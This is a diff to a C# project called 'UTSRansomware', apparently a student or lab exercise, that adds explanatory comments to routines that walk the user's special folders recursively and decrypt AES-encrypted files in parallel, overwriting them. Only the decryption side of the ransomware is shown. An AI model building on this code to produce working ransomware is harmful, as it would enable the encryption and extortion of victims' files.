@@ -22,6 +22,7 @@ namespace UTSRansomware
         }
 
         // Loops over special directories and decrypts all files in them
+        // Uses Environment.SpecialFolders to get paths of folders
         public void DecryptSpecialDirectories()
         {
             foreach (Environment.SpecialFolder folder in Utils.specialFolders)
@@ -29,6 +30,11 @@ namespace UTSRansomware
                 string folderPath = Environment.GetFolderPath(folder);
                 if (Directory.Exists(folderPath))
                 {
+                    /* 
+                     * As this just brute force tries every file in these directories it run into a lot of
+                     * UnauthorizedAccessException as even when running with admin credentials files can be still
+                     * locked or not accessable.
+                    */
                     try
                     {
                         DecryptDirectory(folderPath);
@@ -53,10 +59,14 @@ namespace UTSRansomware
             string[] filePaths = Directory.GetFiles(parentDirectory);
             string[] directoryPaths = Directory.GetDirectories(parentDirectory);
 
+            // Loops over all subfolders and recursively calls itself
             foreach (string directoryPath in directoryPaths)
             {
                 DecryptDirectory(directoryPath);
             }
+
+            // Using multi threaded processing to try improve speed
+            // Don't think this is working properly so will have to fix
             Parallel.ForEach(filePaths, (filePath) =>
             {
                 try
@@ -93,7 +103,7 @@ namespace UTSRansomware
                 ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
 
                 // Open file streams to read the encrypted file and output the decrypted file
-                // Outputs as a temp file
+                // Outputs as a temp file that is then used to overwrite encrypted file
                 using (FileStream fsEncrypted = new FileStream(encryptedFilePath, FileMode.Open, FileAccess.Read))
                 using (FileStream fsDecrypted = new FileStream(tempFilePath, FileMode.OpenOrCreate, FileAccess.Write))
                 using (CryptoStream cs = new CryptoStream(fsEncrypted, decryptor, CryptoStreamMode.Read))
